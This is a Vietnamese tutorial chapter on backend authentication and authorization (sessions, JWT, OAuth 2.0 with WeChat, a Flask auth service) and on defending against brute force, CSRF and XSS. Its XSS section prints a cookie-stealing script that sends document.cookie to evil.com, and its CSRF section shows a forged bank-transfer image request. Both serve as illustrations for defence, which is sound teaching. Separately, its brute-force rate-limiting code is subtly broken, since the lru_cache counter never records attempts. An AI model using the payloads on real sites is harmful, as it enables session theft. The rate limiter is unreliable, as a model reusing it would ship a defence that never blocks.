# Hệ thống Xác thực và Phân quyền
> 💡 **Hướng dẫn học tập**: Chương này sẽ giúp bạn hiểu sâu về "hệ thống kiểm soát ra vào" của hệ thống backend — xác thực và phân quyền. Chúng ta sẽ bắt đầu từ những khái niệm cơ bản nhất "bạn là ai", rồi từng bước nắm vững các phương pháp xác thực hiện đại như Session, JWT, OAuth 2.0 và hơn thế nữa.

<AuthEvolutionDemo />

## 0. Lời mở đầu: "Hệ thống kiểm soát ra vào" của hệ thống

Tại sao sau khi đăng nhập WeChat, khi tắt rồi mở lại vẫn còn trong trạng thái đã đăng nhập?
Tại sao khi truy cập Bilibili, hệ thống biết bạn là thành viên VIP hay người dùng bình thường?
Tại sao bạn có thể dùng WeChat quét mã QR để đăng nhập vào một trang web bên thứ ba mà không cần nhập mật khẩu?

Đằng sau tất cả đó là một hệ thống lõi: **Xác thực & Phân quyền (Authentication & Authorization)**.

Nếu so sánh hệ thống backend như một tòa nhà:

- **Xác thực (Authentication)**: Xác nhận "bạn là ai" (kiểm tra thẻ căn cước/thẻ ra vào).
- **Phân quyền (Authorization)**: Xác nhận "bạn có thể đi đâu" (thành viên VIP có thể vào phòng chờ VIP, người dùng bình thường thì không).

### 0.1 Tại sao cần xác thực?

Chỉ có một lý do: **Bảo vệ tài nguyên**.

- **Bảo vệ quyền riêng tư**: Thông tin cá nhân, tin nhắn của bạn, chỉ bạn mới có thể nhìn thấy.
- **Kiểm soát quyền hạn**: Quản trị viên có thể xóa người dùng, người dùng bình thường thì không.
- **Ngăn chặn lạm dụng**: Ngăn các cuộc gọi độc hại, spam API.

<AuthBasicsDemo />

### 0.2 Bản trình diễn tương tác: Quy trình đăng nhập

Hãy cùng xem một bản trình diễn đăng nhập thực tế để hiểu xác thực và phân quyền hoạt động như thế nào.

<AuthInteractiveLoginDemo />

**Điểm chính**: Xác thực là lớp bảo vệ đầu tiên, tất cả các hoạt động nhạy cảm đều phải xác minh danh tính trước.

---

## 1. Khái niệm cơ bản: Xác thực so với Phân quyền

### 1.1 Xác thực (Authentication): Bạn là ai?

Xác nhận danh tính của người dùng.

- _Ví dụ_: Nhập tên người dùng mật khẩu, quét vân tay, nhận diện khuôn mặt.
- _Đầu ra_: Một mã thông báo (Token) đại diện cho "bạn".
- _Viết tắt tiếng Anh_: **AuthN**

### 1.2 Phân quyền (Authorization): Bạn có thể làm gì?

Xác nhận người dùng có những quyền hạn nào.

- _Ví dụ_: Quản trị viên có thể xóa bài viết, người dùng bình thường chỉ có thể thích bài.
- _Đầu ra_: Cho phép hoặc từ chối truy cập.
- _Viết tắt tiếng Anh_: **AuthZ**

### 1.3 Mối quan hệ giữa hai khái niệm

```
Yêu cầu từ người dùng → Xác thực (bạn là ai?) → Phân quyền (bạn có thể làm?) → Thực hiện logic kinh doanh
                          ↓                        ↓
                   Xác minh danh tính        Kiểm tra quyền hạn
                   (Token có hợp lệ?)       (có quyền delete?)
```

<AuthNvsAuthZDemo />

**Điểm chính**: Xác thực trước, rồi phân quyền. Chỉ khi xác nhận "bạn là ai", mới có thể quyết định "bạn có thể làm gì".

---

## 2. Lịch sử phát triển các phương pháp

### 2.1 Thế hệ thứ nhất: HTTP Basic Authentication

Phương pháp lâu đời nhất, trực tiếp đặt tên người dùng và mật khẩu trong HTTP header.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **Ưu điểm**: Đơn giản, tất cả trình duyệt đều hỗ trợ.
- **Nhược điểm**:
  - Không an toàn (Base64 có thể giải mã, tương đương như gửi mật khẩu)
  - Phải gửi mật khẩu ở mỗi yêu cầu (dễ bị chặn).
  - Không thể chủ động đăng xuất (trừ khi đóng trình duyệt).

**Kết luận**: Chỉ phù hợp cho công cụ test nội bộ, tuyệt đối không dùng trong môi trường production.

### 2.2 Thế hệ thứ hai: Session + Cookie

Phương pháp kinh điển của phát triển web.

**Quy trình**:

```
1. Người dùng đăng nhập (POST /login)
   → Máy chủ xác minh tên người dùng và mật khẩu
   → Tạo Session (trong bộ nhớ máy chủ hoặc Redis)
   → Trả về Set-Cookie: session_id=abc123

2. Các yêu cầu tiếp theo
   → Trình duyệt tự động gửi Cookie: session_id=abc123
   → Máy chủ tìm kiếm Session dựa trên session_id
   → Nếu tìm thấy, coi như "bạn là bạn"
```

**Ví dụ code**:

```python
# Backend (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Xác minh tên người dùng và mật khẩu
    user = db.authenticate(username, password)
    if user:
        # Tạo Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Tên người dùng hoặc mật khẩu không đúng"}, 401

@app.route("/api/admin/users")
def get_users():
    # Kiểm tra Session
    if "user_id" not in session:
        return {"error": "Chưa đăng nhập"}, 401

    # Kiểm tra quyền hạn
    if session.get("role") != "admin":
        return {"error": "Không đủ quyền"}, 403

    # Thực hiện logic kinh doanh
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**Ưu điểm**:

- Đơn giản và trực quan, dễ hiểu.
- Máy chủ có thể chủ động đăng xuất (xóa Session).

**Nhược điểm**:

- **Máy chủ có trạng thái**: Cần lưu trữ Session, nhiều máy chủ cần chia sẻ (như Redis).
- **Khó hỗ trợ cross-domain**: Cookie mặc định không thể cross-domain (vấn đề CORS).
- **Tấn công CSRF**: Trang web độc hại có thể giả mạo Cookie của bạn.

**Kết luận**: Phù hợp với các ứng dụng web truyền thống (server-side rendering), không phù hợp với mobile và SPA hiện đại.

### 2.3 Thế hệ thứ ba: Token (JWT)

Phương pháp phổ biến chính của web hiện đại.

**Ý tưởng lõi**: Không lưu trữ trạng thái trên máy chủ, mã hóa thông tin người dùng thành Token, đặt trên client.

**Cấu trúc JWT**:

```
JWT = Header.Payload.Signature

Ví dụ:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: Thông tin thuật toán (như `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: Thông tin người dùng (như `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: Chữ ký (ngăn chặn giả mạo).

**Quy trình**:

```python
# 1. Người dùng đăng nhập
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # Tạo JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # Hết hạn sau 24 giờ
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Tên người dùng hoặc mật khẩu không đúng"}, 401

# 2. Các yêu cầu tiếp theo
@app.route("/api/admin/users")
def get_users():
    # Lấy Token từ Header
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Chưa cung cấp Token"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Xác minh và giải mã Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token đã hết hạn"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token không hợp lệ"}, 401

    # Kiểm tra quyền hạn
    if payload.get("role") != "admin":
        return {"error": "Không đủ quyền"}, 403

    # Thực hiện logic kinh doanh
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**Ưu điểm**:

- **Không có trạng thái**: Máy chủ không lưu trữ Session, dễ mở rộng theo chiều ngang.
- **Hỗ trợ cross-domain tốt**: Đặt trong Header, không bị giới hạn cross-domain của Cookie.
- **Thân thiện với mobile**: Native App cũng có thể sử dụng dễ dàng.
- **Thông tin phong phú**: Payload có thể lưu thông tin người dùng, quyền hạn, v.v.

**Nhược điểm**:

- **Không thể chủ động đăng xuất**: Một khi Token được phát hành, sẽ có hiệu lực cho đến khi hết hạn (trừ khi dùng danh sách đen).
- **Payload có thể nhìn thấy**: Base64 encoded, không thể lưu thông tin nhạy cảm (như mật khẩu).
- **Token quá lớn**: Phải gửi ở mỗi yêu cầu, vài trăm byte.

**Kết luận**: Phương pháp tiêu chuẩn cho web hiện đại và mobile.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: Đăng nhập bên thứ ba

Chắc bạn đã thấy nút này: "Đăng nhập với WeChat", "Đăng nhập với Google".

Đó chính là **OAuth 2.0**: Một **framework phân quyền** (không phải xác thực!).

### 3.1 Các vai trò chính

| Vai trò                      | Giải thích               | Ví dụ                |
| :--------------------------- | :----------------------- | :------------------- |
| **Resource Owner**           | Chủ sở hữu tài nguyên (người dùng) | Bạn                  |
| **Client**                   | Ứng dụng bên thứ ba      | Một trang web nào đó |
| **Authorization Server**     | Máy chủ phân quyền       | WeChat, Google       |
| **Resource Server**          | Máy chủ tài nguyên       | API thông tin người dùng WeChat |

### 3.2 Mô hình mã phân quyền (Authorization Code Flow)

Mô hình an toàn nhất, phù hợp cho các dịch vụ có backend.

**Quy trình**:

```
1. Người dùng nhấp vào "Đăng nhập với WeChat"
   → Chuyển hướng đến trang phân quyền WeChat
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. Người dùng quét mã và đồng ý phân quyền
   → WeChat chuyển hướng lại trang web của bạn
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Backend của bạn dùng code để lấy access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → Trả về: { "access_token": "...", "openid": "..." }

4. Dùng access_token để lấy thông tin người dùng
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → Trả về: { "nickname": "Zhāng Sān", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**Ví dụ code**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Chuyển hướng đến trang phân quyền WeChat
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Lấy code
    code = request.args.get("code")
    state = request.args.get("state")

    # Xác minh state (ngăn CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Dùng code để lấy access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Lấy thông tin người dùng
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Tạo hoặc cập nhật người dùng cục bộ
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Tạo JWT của hệ thống này
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**Điểm chính**:

- **Code chỉ có thể dùng một lần**: Sau khi sử dụng sẽ mất hiệu lực, ngăn chặn bị chặn.
- **State ngăn CSRF**: Tạo chuỗi ngẫu nhiên, xác minh khi callback, ngăn trang web độc hại giả mạo.
- **redirect_uri phải khớp**: Đăng ký trước trên nền tảng WeChat, ngăn tấn công chuyển hướng.

### 3.3 Các mô hình khác

| Mô hình                                | Trường hợp sử dụng          | An toàn            |
| :------------------------------------- | :--------------------------- | :------------------ |
| **Mã phân quyền**                      | Server có backend            | ⭐⭐⭐⭐⭐        |
| **Mô hình đơn giản (Implicit)**        | Ứng dụng frontend thuần (SPA) | ⭐⭐⭐ (không nên) |
| **Mô hình mật khẩu (Resource Owner)**  | App cao độ tin tưởng (Official App) | ⭐⭐             |
| **Mô hình client (Client Credentials)** | Giao tiếp giữa các máy chủ (không có người dùng) | ⭐⭐⭐⭐        |

<OAuth2ModesDemo />

---

## 4. Thực tế: Thiết kế một hệ thống xác thực hoàn chỉnh

### 4.1 Phân tích nhu cầu

- **Hỗ trợ nhiều nền tảng**: Web, iOS, Android.
- **Đăng nhập bên thứ ba**: WeChat, Google.
- **Kiểm soát quyền hạn**: Người dùng bình thường, VIP, quản trị viên.
- **Bảo mật**: Ngăn spam, ngăn bị chiếm đoạt, ngăn tấn công replay.

### 4.2 Thiết kế kiến trúc

```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting (Giới hạn tốc độ) |
│  - Token Validation (Xác minh)   │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service (Dịch vụ xác thực) |
│  - Đăng ký, đăng nhập            │
│  - Phát hành và xác minh Token    │
│  - Tích hợp OAuth 2.0            │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services            │
│  - User Service                 │
│  - Order Service                │
│  - Payment Service              │
└─────────────────────────────────┘
```

### 4.3 Thiết kế cơ sở dữ liệu

```sql
-- Bảng người dùng
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt hash
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Bảng liên kết đăng nhập bên thứ ba
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- User ID của bên thứ ba
    access_token TEXT,  -- Lưu trữ mã hóa
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Bảng danh sách đen Token (dùng cho đăng xuất chủ động)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JTI của JWT (định danh duy nhất)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 Cài đặt code

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # Dùng biến môi trường trong production

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Kiểm tra tên người dùng đã tồn tại chưa
        if db.get_user_by_username(username):
            raise ValueError("Tên người dùng đã tồn tại")

        # 2. Hash mật khẩu (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Tạo người dùng
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Phát hành Token
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Truy vấn người dùng
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Tên người dùng hoặc mật khẩu không đúng")

        # 2. Xác minh mật khẩu
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Tên người dùng hoặc mật khẩu không đúng")

        # 3. Phát hành Token
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (thời hạn ngắn, như 1 giờ)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # Định danh duy nhất
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (thời hạn dài, như 30 ngày)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # Thời hạn hết hiệu lực của access_token (giây)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Loại token không hợp lệ")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token đã hết hạn")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token không hợp lệ")

    def logout(self, token: str):
        # Thêm Token vào danh sách đen
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Kiểm tra có trong danh sách đen không
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token đã được đăng xuất")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token đã hết hạn")
        except jwt.InvalidTokenError:
            raise ValueError("Token không hợp lệ")

# Decorator API
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Lấy Token từ Header
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Chưa cung cấp Token"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Xác minh Token
                payload = auth_service.verify_token(token)
                # Tiêm thông tin người dùng vào ngữ cảnh yêu cầu
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "Chưa đăng nhập"}, 401

            if request.user["role"] not in roles:
                return {"error": "Không đủ quyền"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Ví dụ sử dụng
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. Các thực hành tốt nhất về bảo mật

### 5.1 Lưu trữ mật khẩu

**❌ Cách sai**:

```python
# Lưu trữ mật khẩu dưới dạng văn bản (tuyệt đối không được!)
db.save_password(username, password)

# Hash MD5 / SHA1 (không đủ an toàn, dễ bị bảng cầu vồng crack)
hash = md5(password)
db.save_password(username, hash)
```

**✅ Cách đúng**:

```python
# bcrypt (hash thích ứng, hash chậm để ngăn chặn brute force)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # rounds càng lớn càng an toàn nhưng chậm hơn
)

# Xác minh
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Mật khẩu đúng
```

**Tại sao bcrypt?**

- **Chậm**: Cố ý thiết kế chậm (ở mức mili giây), ngăn brute force.
- **Thích ứng**: Có thể điều chỉnh rounds, tăng cường theo phần cứng mạnh hơn.
- **Có muối**: Tích hợp muối ngẫu nhiên, ngăn bảng cầu vồng.

<PasswordHashingDemo />

### 5.2 Ngăn chặn brute force

- **Giới hạn tốc độ**: Cùng một IP / tên người dùng, chỉ được thử 5 lần trong 1 phút.
- **Mã xác minh**: Sau 3 lần thất bại, yêu cầu nhập mã xác minh.
- **Khóa tài khoản**: Sau 10 lần thất bại, khóa tài khoản trong 30 phút.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Trả về (số lần thử, thời gian lần đầu)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Đặt lại nếu quá 1 phút
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Từ chối nếu quá 5 lần
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # Lưu lại cache

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Kiểm tra giới hạn tốc độ
    if not check_rate_limit(username):
        return {"error": "Quá nhiều lần thử, vui lòng thử lại sau 1 phút"}, 429

    password = request.json["password"]

    # Xác minh mật khẩu
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Đăng nhập thành công, xóa bộ đếm
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Đăng nhập thất bại, ghi lại
        record_login_attempt(username)
        return {"error": "Tên người dùng hoặc mật khẩu không đúng"}, 401
```

### 5.3 Phòng chống CSRF (Cross-Site Request Forgery)

**Kịch bản tấn công**:
Bạn đã đăng nhập vào trang web ngân hàng `bank.com`, rồi truy cập trang web độc hại `evil.com`. Trang `evil.com` chứa một đoạn code:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

Trình duyệt của bạn sẽ gửi yêu cầu này với Cookie của ngân hàng (yêu cầu cross-domain), dẫn đến tiền bị chuyển.

**Biện pháp phòng chống**:

1.  **CSRF Token**:
    - Máy chủ tạo Token ngẫu nhiên, đặt trong form.
    - Khi submit, xác minh Token có khớp không.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # Xác minh CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token không hợp lệ"}, 403

    # Thực hiện chuyển tiền
    ...
```

2.  **SameSite Cookie**:
    - Đặt thuộc tính `SameSite` của Cookie thành `Strict` hoặc `Lax`.

```python
# Ví dụ Flask
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # hoặc 'Strict'
    SESSION_COOKIE_SECURE=True      # Chỉ cho phép HTTPS
)
```

3.  **Sử dụng JWT (không dùng Cookie)**:
    - JWT lưu trong `localStorage`, không tự động gửi, bảo vệ tự nhiên chống CSRF.

<CSRFDefenseDemo />

### 5.4 Phòng chống XSS (Cross-Site Scripting)

**Kịch bản tấn công**:
Người dùng độc hại nhập vào mục bình luận:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Nếu trang web hiển thị trực tiếp nội dung này, Cookie của các người dùng khác sẽ bị đánh cắp.

**Biện pháp phòng chống**:

1.  **Escape đầu ra**:
    - Chuyển đổi `<` thành `&lt;`, `>` thành `&gt;`.

```python
import html

def render_comment(comment):
    # Escape HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - Đặt HTTP header, giới hạn nguồn của script.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - Đặt thuộc tính `HttpOnly` của Cookie, JavaScript không thể đọc.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. Tóm tắt và lộ trình học tập

Xác thực là "kỹ năng cơ bản" của hệ thống backend, chỉ khi nắm vững mới có thể xây dựng ứng dụng an toàn đáng tin cây.

### 6.1 Các điểm kiến thức cốt lõi

| Điểm kiến thức            | Mức độ quan trọng | Độ khó | Tần suất thực tế |
| :------------------------ | :--------------- | :----- | :--------------- |
| **Session + Cookie**      | ⭐⭐⭐⭐         | Trung  | Cao              |
| **JWT**                   | ⭐⭐⭐⭐⭐       | Thấp   | Cực cao          |
| **OAuth 2.0**             | ⭐⭐⭐⭐         | Cao    | Cao              |
| **Hash mật khẩu (bcrypt)** | ⭐⭐⭐⭐⭐       | Thấp   | Cực cao          |
| **Giới hạn tốc độ & Phòng brute force** | ⭐⭐⭐⭐⭐ | Trung | Cực cao |
| **Phòng chống CSRF**      | ⭐⭐⭐⭐         | Trung  | Trung            |
| **Phòng chống XSS**       | ⭐⭐⭐⭐         | Thấp   | Cao              |

### 6.2 Lộ trình học tập

1.  **Nhập môn** (1-2 ngày):
    - Hiểu sự khác biệt giữa xác thực và phân quyền.
    - Nắm vững nguyên lý của Session + Cookie.
    - Cài đặt chức năng đăng ký và đăng nhập đơn giản.

2.  **Nâng cao** (1 tuần):
    - Học nguyên lý của JWT và cài đặt.
    - Xây dựng hệ thống xác thực dựa trên JWT.
    - Nắm vững hash mật khẩu (bcrypt).

3.  **Thực tế** (2-4 tuần):
    - Tích hợp OAuth 2.0 (đăng nhập WeChat, Google).
    - Cài đặt giới hạn tốc độ, phòng brute force.
    - Phòng chống các tấn công phổ biến như CSRF, XSS.

4.  **Chuyên sâu** (liên tục):
    - Học RBAC (Kiểm soát truy cập dựa trên vai trò).
    - Nghiên cứu SSO (Đăng nhập duy nhất).
    - Khám phá Zero Trust Architecture (Kiến trúc không tin tưởng).

### 6.3 Tài nguyên được đề xuất

- **Tiêu chuẩn**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **Bài viết**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0 phiên bản tiếng Trung: https://oauth.net/2/
- **Công cụ**:
  - jwt.io (Công cụ debug JWT online)
  - Postman (Kiểm tra API)

---

## 7. Bảng tra cứu thuật ngữ (Glossary)

| Thuật ngữ         | Tên đầy đủ                  | Giải thích                                                                 |
| :---------------- | :-------------------------- | :------------------------------------------------------------------------- |
| **AuthN**         | Authentication              | **Xác thực**. Xác nhận "bạn là ai" (như nhập mật khẩu để xác minh danh tính). |
| **AuthZ**         | Authorization               | **Phân quyền**. Xác nhận "bạn có thể làm gì" (như chỉ quản trị viên mới xóa). |
| **Session**       | -                           | **Phiên làm việc**. Thông tin trạng thái người dùng lưu trên máy chủ.        |
| **Cookie**        | -                           | **Cái bánh nhỏ**. Dữ liệu nhỏ lưu trên trình duyệt, tự động gửi mỗi lần yêu cầu. |
| **JWT**           | JSON Web Token              | **Token Web JSON**. Phương pháp xác thực không có trạng thái, gồm Header, Payload, Signature. |
| **OAuth 2.0**     | -                           | **Phân quyền mở**. Framework chuẩn hóa cho đăng nhập bên thứ ba (như "đăng nhập với WeChat"). |
| **SSO**           | Single Sign-On              | **Đăng nhập duy nhất**. Đăng nhập một lần, có thể truy cập nhiều ứng dụng (như dùng tài khoản Google cho mọi dịch vụ). |
| **RBAC**          | Role-Based Access Control   | **Kiểm soát truy cập dựa trên vai trò**. Quyết định quyền hạn dựa trên vai trò người dùng (như admin, user). |
| **CSRF**          | Cross-Site Request Forgery  | **Giả mạo yêu cầu cross-site**. Kẻ tấn công lừa người dùng gửi yêu cầu độc hại (như chuyển tiền). |
| **XSS**           | Cross-Site Scripting        | **Script cross-site**. Kẻ tấn công chèn script độc hại vào trang web (như đánh cắp Cookie). |
| **bcrypt**        | -                           | **Thuật toán hash mật khẩu**. Hash chậm chuyên dụng để lưu trữ mật khẩu, chống brute force. |
| **Access Token**  | -                           | **Token truy cập**. Token có thời hạn ngắn, dùng để truy cập API.            |
| **Refresh Token** | -                           | **Token làm mới**. Token có thời hạn dài, dùng để lấy Access Token mới.      |
| **Scope**         | -                           | **Phạm vi quyền**. Khái niệm trong OAuth 2.0, biểu thị quyền mà ứng dụng bên thứ ba yêu cầu (như đọc thông tin người dùng). |
| **PKCE**          | Proof Key for Code Exchange | **Chìa khóa chứng minh trao đổi mã**. Mở rộng OAuth 2.0 để tăng cường bảo mật cho client công khai (như SPA). |
